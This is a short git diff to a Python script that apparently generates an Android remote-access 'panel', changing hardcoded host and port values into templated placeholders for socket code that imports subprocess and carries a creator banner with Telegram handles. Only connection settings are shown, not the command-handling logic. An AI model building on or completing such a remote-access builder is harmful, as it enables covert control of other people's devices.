@@ -35,8 +35,8 @@ import socket
 import subprocess
 import os
 from colorama import Fore ,Back ,Style
-HOST = '123'
-PORT = 13
+HOST = '{ip}'
+PORT = {port} 
 B_SIZE = 1024 * 128
 SEPARATOR = "_elf_"
 '''+'''
@@ -87,7 +87,7 @@ def panel_1():
         pass
     file_panel = open('panel_android.py','w+')
 
-    panel = '''
+    panel = f'''
 import socket, os
 from colorama import Fore ,Back ,Style  
 
@@ -144,8 +144,8 @@ print(Back.WHITE+Fore.BLACK+Style.BRIGHT+"""
 print(Back.BLACK+"\n")
 print(Fore.LIGHTGREEN_EX+Style.BRIGHT+Back.BLACK+"creator => @e_l_f_6_6_6\n\n\nmy channel_telegram : @elf_security_cyber")
 
-HOST = "192.168.1.35"
-PORT = 8080
+HOST = "{ip}"
+PORT = port
 B_SIZE = 1024 * 128
 SEPARATOR = "_elf_"
 s = socket.socket()
